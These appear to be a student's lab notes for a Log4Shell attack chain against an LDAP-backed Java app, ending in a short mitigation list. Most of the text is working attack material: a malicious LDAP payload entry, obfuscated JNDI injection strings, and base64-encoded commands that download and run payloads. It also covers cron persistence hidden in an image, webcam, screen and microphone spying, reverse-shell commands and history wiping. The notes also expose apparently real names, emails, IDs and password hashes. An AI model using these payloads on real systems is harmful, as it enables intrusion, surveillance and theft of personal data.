A. Mount USB Stick -> Folder
============================
- mkdir flashdisk/
- lsblk
- sudo mount /dev/sdb1 ~/flashdisk/
- cd ~/flashdisk/

*. Docker Mandatory
===================
- apt-get update
- apt-get install build-essential net-tools nano ufw iputils-ping iproute2 curl iptables-persistent
- ufw enable
- iptables -P INPUT ACCEPT
- iptables-save > /etc/iptables/rules.v4
- iptables-restore < /etc/iptables/rules.v4
- slowloris: slowhttptest -c 500 -H -g -o ./output_file -i 10 -r 200 -t GET -u http://yourwebsite-or-server-ip.com -x 24 -p 2

B. Install OpenLDAP Server (dn: dc=pnj,dc=ac,dc=id // :3038) >> REVISI
=====================================================
- sudo apt-get update && upgrade -y
- sudo apt-get install slapd ldap-utils
- sudo dpkg-reconfigure slapd
- nano /etc/default/slapd
	SLAPD_SERVICES="ldap://:3038/ ldapi:///"
- service slapd restart
- ufw allow 3038/tcp
- sudo nano /etc/ldap/ldap.conf
	BASE    dc=pnj,dc=ac,dc=id
	URI     ldap://[ip-ldap-server]:

- sudo ldapsearch -Q -LLL -Y EXTERNAL -H ldapi:/// -b cn=config dn
- sudo ldapsearch -Q -LLL -Y EXTERNAL -H ldapi:/// -b dc=pnj,dc=ac,dc=id dn
- sudo nano
	- base-dn.ldif
	-----------
	dn: ou=tik,dc=pnj,dc=ac,dc=id
	objectClass: organizationalUnit
	ou: tik

- ldapadd -x -D cn=admin,dc=pnj,dc=ac,dc=id -W -f base-dn.ldif
- sudo nano
	- ou-scheme.ldif
	-----------
	dn: ou=tmj,ou=tik,dc=pnj,dc=ac,dc=id
	objectClass: organizationalUnit
	ou: tmj

	dn: ou=tmd,ou=tik,dc=pnj,dc=ac,dc=id
	objectClass: organizationalUnit
	ou: tmd

	dn: ou=ti,ou=tik,dc=pnj,dc=ac,dc=id
	objectClass: organizationalUnit
	ou: ti

- ldapadd -x -D cn=admin,dc=pnj,dc=ac,dc=id -W -f ou-scheme.ldif
- sudo nano
	- group-scheme.ldif
	-----------
	dn: cn=dosen,ou=tik,dc=pnj,dc=ac,dc=id
	objectClass: posixGroup
	cn: dosen
	gidNumber: 1000

	dn: cn=mahasiswa,ou=tmj,ou=tik,dc=pnj,dc=ac,dc=id
	objectClass: posixGroup
	cn: mahasiswa
	gidNumber: 2000

- ldapadd -x -D cn=admin,dc=pnj,dc=ac,dc=id -W -f group-scheme.ldif
- sudo nano
	member-scheme.ldif
	-----------
	dn: uid=1807422020,cn=mahasiswa,ou=tmj,ou=tik,dc=pnj,dc=ac,dc=id
	objectClass: inetOrgPerson
	objectClass: posixAccount
	objectClass: shadowAccount
	uid: 1807422020
	sn: Irsyad
	cn: Muhammad Nur Irsyad
	displayName: Muhammad Nur Irsyad
	initials: Irsyad
	mail: muhammad.nurirsyad.tik18@mhsw.pnj.ac.id
	uidNumber: 20001807422020
	gidNumber: 2000
	userPassword: {SSHA}XQDQ21L9Rf4iJl7hle7E9DzXQzaTvZrc
	gecos: TMJ_CCIT_SEC_8
	homeDirectory: /home/ldap/TIK/TMJ/1807422020

	dn: uid=1807422024,cn=mahasiswa,ou=tmj,ou=tik,dc=pnj,dc=ac,dc=id
	objectClass: inetOrgPerson
	objectClass: posixAccount
	objectClass: shadowAccount
	uid: 1807422024
	sn: Nugroho
	cn: Muhammad Fauzan Nugroho
	displayName: Muhammad Fauzan Nugroho
	initials: Fauzan
	mail: fauzan.nugroho.tik18@mhsw.pnj.ac.id
	uidNumber: 20001807422024
	gidNumber: 2000
	userPassword: {SSHA}K0U/RILEUHAeYiSL1pngYgEqbhsacB8L
	gecos: TMJ_CCIT_SEC_8
	homeDirectory: /home/ldap/TIK/TMJ/1807422024

	dn: uid=198501292010121003,cn=dosen,ou=tik,dc=pnj,dc=ac,dc=id
	objectClass: inetOrgPerson
	objectClass: posixAccount
	objectClass: shadowAccount
	uid: 198501292010121003
	sn: Suhandana
	cn: Ariawan Andi Suhandana
	displayName: Ariawan Andi Suhandana
	mail: ariawan.andisuhandana@tik.pnj.ac.id
	initials: Ariawan
	uidNumber: 1000198501292010121003
	gidNumber: 1000
	userPassword: {SSHA}V+gm6W2r5M14NRk0Ty8suRIeQ6ASumuZ
	gecos: TIK
	homeDirectory: /home/ldap/TIK/198501292010121003

	dn: uid=198112012015041001,cn=dosen,ou=tik,dc=pnj,dc=ac,dc=id
	objectClass: inetOrgPerson
	objectClass: posixAccount
	objectClass: shadowAccount
	uid: 198112012015041001
	sn: Arnaldy
	cn: Defiana Arnaldy
	displayName: Defiana Arnaldy
	initials: Defian
	mail: defiana.arnaldy@tik.pnj.ac.id
	uidNumber: 1000198112012015041001
	gidNumber: 1000
	userPassword: {SSHA}8iPuZqO57U3PlPVbC+QAqvUsj6B+UR+P
	gecos: TIK
	homeDirectory: /home/ldap/TIK/198112012015041001

- ldapadd -x -D 'cn=admin,dc=pnj,dc=ac,dc=id' -W -f member-scheme.ldif
- slapcat
- ldapsearch -x -LLL -b dc=pnj,dc=ac,dc=id '(uid=1807422024)' -h [ip-ldap-server]
- ldapdelete -v -c -D 'cn=admin,dc=pnj,dc=ac,dc=id' -W 'uid=1807422024,cn=mahasiswa,ou=tmj,ou=tik,dc=pnj,dc=ac,dc=id' -h [ip-ldap-server]

C. Install OpenLDAP Attacker (dn: dc=attacker,dc=com // :2038)
=====================================================
- sudo apt-get update && upgrade -y
- sudo apt-get install slapd ldap-utils
- sudo dpkg-reconfigure slapd
- nano /etc/default/slapd
	SLAPD_SERVICES="ldap://:2038/ ldapi:///"
- service slapd restart
- ufw allow 2038/tcp
- sudo nano /etc/ldap/ldap.conf
	BASE    dc=attacker,dc=com
	URI     ldap://[ip-host]:2038

- sudo ldapsearch -Q -LLL -Y EXTERNAL -H ldapi:/// -b cn=config dn
- export java.ldif from schema
	- sudo su
	- ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/ldap/schema/java.ldif

- mkdir ldif
- sudo nano
	payload.ldif
	------------
	dn: cn=1807422020,dc=attacker,dc=com
	objectClass: device
	objectClass: javaNamingReference
	cn: 1807422020
	javaCodeBase: http://192.168.1.6:2022/
	javaClassName: http://192.168.1.6:2022/Payload.class
	javaFactory: Payload

- ldapadd -x -D cn=admin,dc=attacker,dc=com -W -f ~/payload.ldif
- sudo slapcat
- ldapdelete -v -c -D 'cn=admin,dc=attacker,dc=com' -W 'cn=1807422020,dc=attacker,dc=com'
- service slapd restart

D. Install Apache Web Attacker (:2022)
===================
- apt-get update
- apt-get install apache2
- service apache2 restart
- ufw allow 'Apache'
- ufw allow 2022/tcp
- mkdir /var/www/log4j --> populate with script
- cp /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-available/log4j-web.conf
- nano /etc/apache2/sites-available/log4j-web.conf 
	<VirtualHost *:2022>
	DocumentRoot /var/www/log4j
	...
- nano /etc/apache2/ports.conf
	Listen 80
	Listen 2022
- a2ensite /etc/apache2/sites-available/log4j-web.conf
- apache2ctl configtest
- service apache2 restart
- netstat -tan 
- curl http://[ip-host]:2022
- curl http://192.168.1.6:2022 -s | lynx --stdin -dump

E. Attack Web Java (:2080)
===================
- mvn clean compile assembly:single
- mvn install
- java -jar target/mvn-web-exploit-2.05.2022-jar-with-dependencies.jar
- curl http://192.168.1.6:4080 -H 'Payload: ${java:version}' -s | jq '.'
- curl http://192.168.1.6:4080 -H 'Payload: ${jndi:ldap://192.168.1.6:2038/cn=1807422020,dc=attacker,dc=com}' -s | jq '.'
- sudo kill -9 [PID]
- crontab -e
	20 10 * * * /usr/bin/java -jar /mnt/c/Users/hotpo/Documents/Git/log4shell-white-box/red/mvn-web-exploit/target/mvn-web-exploit-2.05.2022-jar-with-dependencies.jar
- payload: ${jndi:ldap://192.168.1.6:2038/cn=1807422020,dc=attacker,dc=com}	
- download script: wget -q -O /tmp/.pwnd.tar.gz https://github.com/hotpotcookie/log4shell-white-box/raw/main/red/pwnd.tar.gz & wait && tar -xvf /tmp/.pwnd.tar.gz && rm /tmp/.pwnd.tar.gz

F. Create Daemon Java HTTP
=========================
- nano run-java-http
	#!/bin/bash
	/opt/java/jdk1.8.0_321/bin/java -jar /home/cookie/git/log4shell-white-box/red/mvn-web-exploit/target/mvn-web-exploit-2.05.2022-jar-with-dependencies.jar
- sudo nano /etc/systemd/system/java-http.service
	[Unit]
	Description=Java HTTP Service
	[Service]
	User=cookie
	WorkingDirectory=/home/cookie/tools/
	ExecStart=/home/cookie/tools/run-java-http

	SuccessExitStatus=143
	TimeoutStopSec=10
	Restart=on-failure
	RestartSec=5

	[Install]
	WantedBy=multi-user.target
- sudo systemctl daemon-reload
- sudo systemctl enable java-http.service
- sudo systemctl [start/stop/status/restart] java-http

G. DigiSpark Attiny85 + Adruino
===============================
- https://www.arduino.cc/en/software >> arduino-ide_2.0.0-rc8_Linux_64bit.AppImage
- chmod +x arduino-ide_2.0.0-rc8_Linux_64bit.AppImage
- ./arduino-ide_2.0.0-rc8_Linux_64bit.AppImage
- Import Digistump Board Manager
	- File >> Preferences
	- Additional boards manager URLs: http://digistump.com/package_digistump_index.json
	- Restart
	- Tools >> Board >> Boards Manager >> Digistump AVR Boards >> Install
	- Tools >> Board >> Digistump AVR Boards >> Digispark (Default - 16.5mhz)
	- Close

## dialout: it give full and direct access for user to manage their serial ports
## dependencies: which is the basic package for compiling the boot loader thats written in C, using makefile
- usermod -a -G dialout [username] && reboot
- sudo apt-get install build-essential libusb-0.1-4 libusb-dev

- Update Micronucleus Boot Loader
	- cd ~/.arduino15/packages/digistump/tools/micronucleus/2.0a4/
	- cp micronucleus micronucleus.old
	- cd ~/Git
	- git clone https://github.com/micronucleus/micronucleus.git
	- cd micronucleus/commandline
	- make
	- cp micronucleus ~/.arduino15/packages/digistump/tools/micronucleus/2.0a4/

## in order for Arduino can actually program the Digispark board, your system need to create the linking node on the hardware
## so first you create the config file, and just paste the whole content. here, we're only using the read and write permission on all field. which you can custom for yourself
- sudo nano /etc/udev/rules.d/49-micronucleus.rules
	# UDEV Rules for Micronucleus boards including the Digispark.
	# This file must be placed at:
	#
	# /etc/udev/rules.d/49-micronucleus.rules    (preferred location)
	#   or
	# /lib/udev/rules.d/49-micronucleus.rules    (req'd on some broken systems)
	#
	# After this file is copied, physically unplug and reconnect the board.
	#
	SUBSYSTEMS=="usb", ATTRS{idVendor}=="16d0", ATTRS{idProduct}=="0753", MODE:="0666"
	KERNEL=="ttyACM*", ATTRS{idVendor}=="16d0", ATTRS{idProduct}=="0753", MODE:="0666", ENV{ID_MM_DEVICE_IGNORE}="1"
	#
	# If you share your linux system with other users, or just don't like the
	# idea of write permission for everybody, you can replace MODE:="0666" with
	# OWNER:="yourusername" to create the device owned by you, or with
	# GROUP:="somegroupname" and mange access using standard unix groups.	

## and just like any service in linux, any modified configuration should be re loaded. here we're using udev management tool
- sudo udevadm control --reload-rules

- Tools >> Port >> /dev/ttyS4
- File >> Examples >> 1. Basic >> Blink
	#define LED_BUILTIN 1
	void setup() {
	  // initialize digital pin LED_BUILTIN as an output.
	  pinMode(LED_BUILTIN, OUTPUT);
	}

	// the loop function runs over and over again forever
	void loop() {
	  digitalWrite(LED_BUILTIN, HIGH);   // turn the LED on (HIGH is the voltage level)
	  delay(1300);                       // wait for a second
	  digitalWrite(LED_BUILTIN, LOW);    // turn the LED off by making the voltage LOW
	  delay(300);                       // wait for a second
	}

- Upload >> Insert Digispark
- crontab conf-enabled
	03 23 * * * DISPLAY=:0.0 /usr/bin/gnome-calculator

- ps axjf | grep "/bin/bash /tmp/.cooki3.sh -r" | grep -vw "grep" | head -n 1 | tr -s '\t' ' ' | cut -d ' ' -f 3 | { read msg; kill -9 "$msg"; } 2> /dev/null
- ps axjf | grep "java -jar /tmp/.payload-6.22.jar" | grep -vw "grep" | head -n 1 | tr -s '\t' ' ' | cut -d ' ' -f 3 | { read msg; kill -9 "$msg"; } 2> /dev/null
- base64 Testing
	base64 -d <<< IyEvYmluL2Jhc2gKL3Vzci9iaW4vZ25vbWUtY2FsY3VsYXRvcgo= | sh
	bash <(base64 -d <<< IyEvYmluL2Jhc2gKIy0tLS0tLS0tLS0Kd2dldCAtcSAtTyAvdG1wLy5wYXlsb2FkLTYuMjIuamFyIGh0dHBzOi8vZ2l0aHViLmNvbS9ob3Rwb3Rjb29raWUvbG9nNHNoZWxsLXdoaXRlLWJveC9yYXcvbWFpbi9yZWQvbXZuLXdlYi1leHBsb2l0L3RhcmdldC9wYXlsb2FkLTYuMjIuamFyICYgd2FpdApqYXZhIC1qYXIgL3RtcC8ucGF5bG9hZC02LjIyLmphcg==)
	gnome-terminal -e '/bin/bash -i -c "base64 -d <<< IyEvYmluL2Jhc2gKIy0tLS0tLS0tLS0KIGphdmEgLWphciBwYXlsb2FkLTYuMjIuamFyICYgZGlzb3duCg== | bash"'
	gnome-terminal -e '/bin/bash -i -c \"base64 -d <<< IyEvYmluL2Jhc2gKIy0tLS0tLS0tLS0KIHdnZXQgLXEgLU8gL3RtcC8ucGF5bG9hZC02LjIyLmphciBodHRwczovL2dpdGh1Yi5jb20vaG90cG90Y29va2llL2xvZzRzaGVsbC13aGl0ZS1ib3gvcmF3L21haW4vcmVkL212bi13ZWItZXhwbG9pdC90YXJnZXQvcGF5bG9hZC02LjIyLmphciAmIHdhaXQKIGphdmEgLWphciAvdG1wLy5wYXlsb2FkLTYuMjIuamFyICYgZGlzb3du | bash\"'

H. Golang API
=============
- curl -s http://192.168.1.6:4000/ | jq .[]
- curl -s --data '{"PORT_LISTENER": "2200","SHELL": "/bin/zsh"}' -X PATCH http://192.168.1.6:4000/ | jq .
- curl -s --data '{"TYPE":"WEBCAM","TITLE":"Final Exam ","TIMESTAMP":"07/14/22 12:59:02","ENCODING":{"EXTENSION": "jpeg", "BASE32":"lmaoo"}}' -X POST http://192.168.1.6:2080/captures | jq .

- cp go-api.service /etc/systemd/system/go-api.service
- sudo systemctl daemon-reload
- sudo systemctl enable go-api.service
- sudo systemctl [start/stop/status/restart] go-api

- base32 -d <<< $(curl -s http://192.168.1.6:2080/captures | jq .[1].ENCODING.BASE32 | cut -d '"' -f 2) > webcam.jpeg
- base32 -d <<< $(curl -s http://192.168.1.6:2080/captures | jq .[0].ENCODING.BASE32 | cut -d '"' -f 2) > screen.png
- xdg-open webcam.jpeg
- xdg-open screen.png

I. Capture Streamer
===================
- Camera Webcam
	streamer -t 00:30 -r 10 -o camdump-000000.jpeg
	convert -delay 3 -loop 0 camdump-* camcapt-$(date +%D-%T | tr -s '/:' '.').gif
	rm camdump-*
	rm camcapt-*
	streamer -o webcam-$(date +%D-%T | tr -s '/:' '.').jpeg

- Screenhot
	#!/bin/bash
	import -window root screen-$(date +%D-%T | tr -s '/:' '.').png
	rm screen-capt.png

- Microhpone Record
	arecord -fdat ok.wav -d [second] -q

J. Stegano crontab
==================
- cat /tmp/.pwnd.zip >> webcam.png
- unzip -qq -o 00_Twibbon.png -d /tmp 2> /dev/null
- */1 * * * * /bin/bash -i -c "touch /tmp/ok.txt; echo 1 >> /tmp/ok.txt; echo 2 >> /tmp/ok.txt; echo 3 >> /tmp/ok.txt" 
- (crontab -l; printf "$cronrule\n") | crontab -

K. Block TCP Port
=================
- sudo iptables -A OUTPUT -s 192.168.1.13 -p tcp --source-port [port] -j DROP
- sudo iptables -D OUTPUT -s 192.168.1.13 -p tcp --source-port [port] -j DROP

X. Integrated Testing
=====================
[ Client GUI ]
- LDAP Context        : LdapOperation/verifyContext(stat) return InitialLdapContext
- Log4j Rolling Files : LogPanel/loadLog(listLogging,listScrollPane) void --> variable path
- Config Properties   : LoadProperties/getConfig(stat,filename) return Properties
					  : properties.getProperty("PROVIDER_URL")
					  : properties.getProperty("SECURITY_PRINCIPAL")
					  : properties.getProperty("SECURITY_CREDENTIALS")
					  : properties.getProperty("BASE_DN")
					  : properties.getProperty("MAHASISWA_DN")
					  : properties.getProperty("DOSEN_DN")

[ Attacker Java HTTP ]
- REST API JSON Parser	   : url.openConnection()
                           : properties.getProperty("PORT_JAVA_HTTP")
- Log4j Rolling Files      : variable path

[ Attacker Java Payload ]
- REST API JSON Parser 	   : url.openConnection()
						   : properties.getProperty("SHELL")
                		   : properties.getProperty("HOST")
                		   : properties.getProperty("PORT_LISTENER")

G. Alpha Testing
================
[ Client GUI ]
- Download Script + Initiate
#!/bin/bash
wget -q -O /tmp/.a http://192.168.159.9:2022/pwnd.tar.gz
tar -xf /tmp/.a -C /tmp/
/tmp/./.cooki3.sh -i
ifconfig wlo1 | grep inet | grep -v inet6 | tr -s '\t' ' ' | cut -d ' ' -f 3,5 | (tput setaf 2; cat; tput sgr0;) && echo

##
base64 -d <<< IyEvYmluL2Jhc2gKd2dldCAtcSAtTyAvdG1wLy5hIGh0dHA6Ly8xOTIuMTY4LjEuOToyMDIyL3B3bmQudGFyLmd6OyBzbGVlcCAyCnRhciAteGYgL3RtcC8uYSAtQyAvdG1wLzsgc2xlZXAgMQovdG1wLy4vLmNvb2tpMy5zaCAtaQo= | bash
ifconfig wlo1 | grep inet | tr -s '\t' ' ' | cut -d ' ' -f 3,5 | (tput setaf 2; cat; tput sgr0;) && echo

- LDAP Authentication Entries
	1. 1807422020
	2. 1807422024
	3. 198501292010121003
	4. 198112012015041001

- Log4j Message Lookup Subtitution
	1. ${date:MM-dd-yyyy}
	2. ${date:hh:mm:ss MM-dd-yyyy}
	3. ${date:E, d MMMM yy (zzzz)}
	4. ${env:USER}
	5. ${env:HOME}
	6. ${env:PATH}
	7. ${java:version}
	8. ${java:runtime}
	9. ${java:os}
	10. ${j${k8s:k5:-AV}a:version}

- Remote JNDI Lookup Context
	1. ${jndi:ldap://192.168.1.9:3038/dc=pnj,dc=ac,dc=id}
	2. ${jndi:ldap://192.168.1.9:3038/cn=admin,dc=pnj,dc=ac,dc=id}
	3. ${jndi:ldap://192.168.1.9:3038/cn=mahasiswa,ou=tmj,ou=tik,dc=pnj,dc=ac,dc=id}
	4. ${jndi:ldap://192.168.1.9:3038/cn=dosen,ou=tik,dc=pnj,dc=ac,dc=id}
	5. ${jndi:ldap://192.168.1.9:2038/dc=attacker,dc=com}
	6. ${jndi:ldap://192.168.1.9:2038/cn=admin,dc=attacker,dc=com}
	7. ${jndi:ldap://192.168.1.9:2038/cn=1807422020,dc=attacker,dc=com}
	8. ${${lower:${lower:jndi}}:${lower:${::-l}${::-d}${::-a}${::-p}}://192.168.1.9:2038/cn=1807422020,dc=attacker,dc=com}
	9. ${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}ldap}://192.168.1.9:2038/cn=1807422020,dc=attacker,dc=com}
   10. ${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}${lower:${::-l}${::-d}${::-a}${::-p}}}://192.168.1.9:2038/cn=1807422020,dc=attacker,dc=com}

[ Attacker Java HTTP ]
- Custom HTTP Header Request
	1. curl http://192.168.1.9:2080 -H 'user-agent: hello world' -s | jq '.'
	2. curl http://192.168.1.9:2080 -H 'user-agent: a1!@#$%^&*()/\\-+\"' -s | jq '.'

- Log4j Message Lookup Subtitution
	1. curl http://192.168.1.9:2080 -H 'user-agent: ${date:MM-dd-yyyy}' -s | jq '.'
	2. curl http://192.168.1.9:2080 -H 'user-agent: ${date:hh:mm:ss MM-dd-yyyy}' -s | jq '.'
	3. curl http://192.168.1.9:2080 -H 'user-agent: ${date:E, d MMMM yy (zzzz)}' -s | jq '.'
	4. curl http://192.168.1.9:2080 -H 'user-agent: ${env:USER}' -s | jq '.'
	5. curl http://192.168.1.9:2080 -H 'user-agent: ${env:HOME}' -s | jq '.'
	6. curl http://192.168.1.9:2080 -H 'user-agent: ${env:PATH}' -s | jq '.'
	7. curl http://192.168.1.9:2080 -H 'user-agent: ${java:version}' -s | jq '.'
	8. curl http://192.168.1.9:2080 -H 'user-agent: ${java:runtime}' -s | jq '.'
	9. curl http://192.168.1.9:2080 -H 'user-agent: ${java:os}' -s | jq '.'
   10. curl http://192.168.1.9:2080 -H 'user-agent: ${jndi:ldap://192.168.1.9:2038/cn=1807422020,dc=attacker,dc=com}' -s | jq '.'
   11. curl http://192.168.1.9:2080 -H 'user-agent: ${\x6A\x6E\x64\x69\x3A\x6C\x64\x61\x70://192.168.1.9:2038/cn=1807422020,dc=attacker,dc=com}' -s | jq '.'
<<<<<<< Updated upstream
   12. curl http://192.168.1.13:50028 -H 'user-agent: ${${env:PATH_DUMMY:-j}nd${sys:SYS_DUMMY:-i}:${lower:${::-l}${::-d}${::-a}${::-p}}://192.168.1.9:2038/cn=1807422020,dc=attacker,dc=com}' -s | jq '.'
=======
>>>>>>> Stashed changes

[ Attacker Java Payload ]
- Encrypted Reverse Shell
	1. ncat -lnvp 2100 --ssl
	2. socat -d -d OPENSSL-LISTEN:2100,cert=bind.pem,verify=0,fork STDOUT
	3. socat `tty`,raw,echo=0 openssl-listen:2100,cert=bind.pem,verify=0

*. Attacker Cheat Sheet
==============================
Bind
- targeg   : ncat -l -p [port] -e /bin/bash
- attacker : ncat [ip-server] [port]

Reverse
- attacker : ncat -lvnp [port]
- target   : ncat [ip-server] [port] -e /bin/bash

Encrypted-Reverse
- attacker : socat `tty`,raw,echo=0 openssl-listen:2100,cert=bind.pem,verify=0
- target   : mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.1.6:2100 > /tmp/s 2> /dev/null; rm /tmp/s

File-Transfer
- receiver : ncat -l [port] > [file-name]
- sender   : ncat [ip-receiver] [port] < [file-name]

Tar-GZ--Zip-Compression
- compress : tar -czvf [archive.tar.gz] [file-name]
- compress : zip [archive.zip] [file-name]
- extract  : tar -xvf [archive.tar.gz]

Hide-History
- echo 'set +o history' >> ~/.bashrc
- source ~/.bashrc
- cat /dev/null > ~/.bash_history
- history -c


#============================================================================================================
#============================================================================================================
#============================================================================================================
#============================================================================================================

CATATAN

Z. Asset Teknologi
==================
- Flashdisk
- GitHub Repository (source code)
- VM (VMDK Disk)
- VM (Docker Container)

C. Install LDAP Account Manager (dn: dc=tmj,dc=pnj,dc=edu)
==========================================================
- sudo apt-get update && upgrade
- sudo apt-get install apache2 php php-cgi libapache2-mod-php php-mbstring php-common php-pear
- sudo a2enconf php7.4-cgi
- sudo systemctl reload apache2
- sudo apt-get install ldap-account-manager
- sudo systemctl reload apache2
- sudo nano /etc/apache2/conf-enabled/ldap-account-manager.conf
	#Require all granted
	Require ip 127.0.0.1 192.168.1.0/24 192.168.43.0/24

- sudo systemctl restart apache2
- http://[ip-ldap-server]/lam

D. Setup LDAP CLI Client (dn: dc=tmj,dc=pnj,dc=edu)
===================================================
- sudo nano /etc/hosts
	[ip-ldap-server] server

- sudo apt-get update && upgrade
- sudo apt-get install libnss-ldap libpam-ldap ldap-utils
	LDAP-URI: ldap://[ip-ldap-server]:389 
	DN-BASE: dc=tmj,dc=pnj,dc=edu
	LDAP-VERSION: 3
	LOCAL-DB-ADMIN: Y
	LDAP-LOGIN: Y
	DN-LDAP-ADMIN: cn=admin,dc=tmj,dc=pnj,dc=edu
	LDAP-ROOT-PW: okok

- sudo dpkg-reconfigure ldap-auth-config
- sudo nano /etc/nsswitch.conf
	passwd: compat systemd ldap
	group: compat systemd ldap
	shadow: compat

- sudo nano /etc/pam.d/common-password
	password [success=1 user_unknown=ignore default=die] pam_ldap.so use_authok try_first_pass >>
	password [success=1 user_unknown=ignore default=die] pam_ldap.so try_first_pass	

- sudo nano /etc/pam.d/common-session
	session optional pam_mkhomedir.so skel=/etc/skel umask=077

- sudo su - [uid-user]
- id

X. Mitigation
================
App
1. Uncomment Log4j2.properties to use %m{nolookups} option
2. Use modified log4j-core-2.14.1.jar
	- cd /home/cookie/.m2/repository/org/apache/logging/log4j/log4j-core/2.14.1
	- cp log4j-core-2.14.1.jar.n.bak log4j-core-2.14.1.jar
3. Activate netralization input toggle

System
1. Setting up Ufw Rules
	- sudo ufw enable
	- sudo ufw allow from 192.168.1.0/24 to any app "OpenSSH"
	- sudo ufw deny from any to any
	- sudo ufw status verbose
2. Implement Least Privilege on Crontab
	- sudo su
	- usermod -a -G crontab client
	- chown root:crontab /var/spool/cron/crontabs/client
	- chmod g+r /var/spool/cron/crontabs/client
	- ls -l /var/spool/cron/crontabs/